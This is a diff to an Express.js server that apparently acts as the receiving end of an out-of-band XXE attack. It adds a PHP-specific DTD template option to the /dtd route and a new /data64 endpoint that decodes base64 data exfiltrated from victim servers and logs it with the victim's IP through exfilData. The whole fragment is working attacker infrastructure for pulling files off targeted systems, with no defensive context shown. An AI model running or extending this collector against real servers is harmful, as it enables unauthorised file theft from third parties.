@@ -32,7 +32,11 @@ app.get('/dtd', (req, res) => {
   console.log('dtd requested');
   let template = '';
   if (req.query.filename) { 
-    template = 'dtd_with_file';
+    if (req.query.php) {
+      template = 'dtd_php_file';
+    } else {
+      template = 'dtd_with_file';
+    }
   } else {
     template = 'dtd';
   }
@@ -52,6 +56,15 @@ app.get('/data', (req, res) => {
   exfilData({'data': data, 'clientIp': req.clientIp});
   res.send('');
 });
+
+app.get('/data64', (req, res) => {
+  let data64 = decodeURIComponent(req.originalUrl.substring(8));
+  var buf = Buffer.from(data64,'base64');
+  console.log('data received');
+  exfilData({'data': buf.toString(), 'clientIp': req.clientIp});
+  res.send('');
+});
+  
 
 app.listen(3000, () => console.log("Listening on 3000"));
 
